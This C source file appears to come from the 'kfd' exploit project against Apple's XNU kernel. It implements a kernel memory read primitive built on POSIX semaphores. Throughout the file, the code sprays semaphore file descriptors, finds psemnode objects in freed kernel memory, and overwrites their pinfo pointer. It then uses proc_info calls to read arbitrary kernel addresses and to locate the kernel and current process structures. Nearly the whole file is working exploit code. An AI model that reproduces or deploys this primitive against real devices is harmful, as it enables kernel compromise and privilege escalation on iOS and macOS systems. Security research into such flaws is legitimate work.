/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#include "kread_sem_open.h"

const char* kread_sem_open_name = "kfd-posix-semaphore";

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(int32_t))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    int32_t sem_fd = (int32_t)(uintptr_t)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    int32_t callnum = PROC_INFO_CALL_PIDFDINFO;
    int32_t pid = kfd->info.env.pid;
    uint32_t flavor = PROC_PIDFDPSEMINFO;
    uint64_t arg = sem_fd;
    uint64_t buffer = (uint64_t)(sem_data);
    int32_t buffersize = (int32_t)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, uint64_t id)
{
    int32_t fd = (int32_t)(uintptr_t)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);

    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, uint64_t object_uaddr)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    if ((pnode[0].pinfo > pac_mask) &&
        (pnode[1].pinfo == pnode[0].pinfo) &&
        (pnode[2].pinfo == pnode[0].pinfo) &&
        (pnode[3].pinfo == pnode[0].pinfo) &&
        (pnode[0].padding == 0) &&
        (pnode[1].padding == 0) &&
        (pnode[2].padding == 0) &&
        (pnode[3].padding == 0)) {
        for (uint64_t object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            int32_t callnum = PROC_INFO_CALL_PIDFDINFO;
            int32_t pid = kfd->info.env.pid;
            uint32_t flavor = PROC_PIDFDPSEMINFO;
            uint64_t arg = fds[object_id];
            uint64_t buffer = (uint64_t)(&data);
            int32_t buffersize = (int32_t)(sizeof(struct psem_fdinfo));

            const uint64_t shift_amount = 4;
            pnode[0].pinfo += shift_amount;
            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
            pnode[0].pinfo -= shift_amount;

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        /*
         * False alarm: it wasn't one of our psemmode objects.
         */
        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    volatile uint64_t* type_base = (volatile uint64_t*)(uaddr);
    uint64_t type_size = ((size) / (sizeof(uint64_t)));
    for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {
        uint64_t type_value = kread_sem_open_kread_u64(kfd, kaddr + (type_offset * sizeof(uint64_t)));
        type_base[type_offset] = type_value;
    }
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    uint64_t pseminfo_kaddr = static_uget(psemnode, pinfo, kfd->kread.krkw_object_uaddr);
    uint64_t semaphore_kaddr = static_kget(pseminfo, uint64_t, psem_semobject, pseminfo_kaddr);
    uint64_t task_kaddr = static_kget(semaphore, uint64_t, owner, semaphore_kaddr);
    uint64_t proc_kaddr = task_kaddr - dynamic_sizeof(proc);
    kfd->info.kernel.kernel_proc = proc_kaddr;

    /*
     * Go backwards from the kernel_proc, which is the last proc in the list.
     */
    while (true) {
        int32_t pid = dynamic_kget(proc, p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kernel.current_proc = proc_kaddr;
            break;
        }

        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, uint64_t id)
{
    /*
     * Let kwrite_sem_open_deallocate() take care of
     * deallocating all the shared file descriptors.
     */
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    /*
     * Let's null out the kread reference to the shared data buffer
     * because kwrite_sem_open_free() needs it and will free it.
     */
    kfd->kread.krkw_method_data = NULL;
}

/*
 * 64-bit kread function.
 */

uint64_t kread_sem_open_kread_u64(struct kfd* kfd, uint64_t kaddr)
{
    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    int32_t kread_fd = fds[kfd->kread.krkw_object_id];
    uint64_t psemnode_uaddr = kfd->kread.krkw_object_uaddr;

    uint64_t old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
    uint64_t new_pinfo = kaddr - static_offsetof(pseminfo, psem_uid);
    static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);

    struct psem_fdinfo data = {};
    int32_t callnum = PROC_INFO_CALL_PIDFDINFO;
    int32_t pid = kfd->info.env.pid;
    uint32_t flavor = PROC_PIDFDPSEMINFO;
    uint64_t arg = kread_fd;
    uint64_t buffer = (uint64_t)(&data);
    int32_t buffersize = (int32_t)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
    return *(uint64_t*)(&data.pseminfo.psem_stat.vst_uid);
}

/*
 * 32-bit kread function that is guaranteed to not underflow a page,
 * i.e. those 4 bytes are the first 4 bytes read by the modified kernel pointer.
 */

uint32_t kread_sem_open_kread_u32(struct kfd* kfd, uint64_t kaddr)
{
    int32_t* fds = (int32_t*)(kfd->kread.krkw_method_data);
    int32_t kread_fd = fds[kfd->kread.krkw_object_id];
    uint64_t psemnode_uaddr = kfd->kread.krkw_object_uaddr;

    uint64_t old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
    uint64_t new_pinfo = kaddr - static_offsetof(pseminfo, psem_usecount);
    static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);

    struct psem_fdinfo data = {};
    int32_t callnum = PROC_INFO_CALL_PIDFDINFO;
    int32_t pid = kfd->info.env.pid;
    uint32_t flavor = PROC_PIDFDPSEMINFO;
    uint64_t arg = kread_fd;
    uint64_t buffer = (uint64_t)(&data);
    int32_t buffersize = (int32_t)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
    return *(uint32_t*)(&data.pseminfo.psem_stat.vst_size);
}
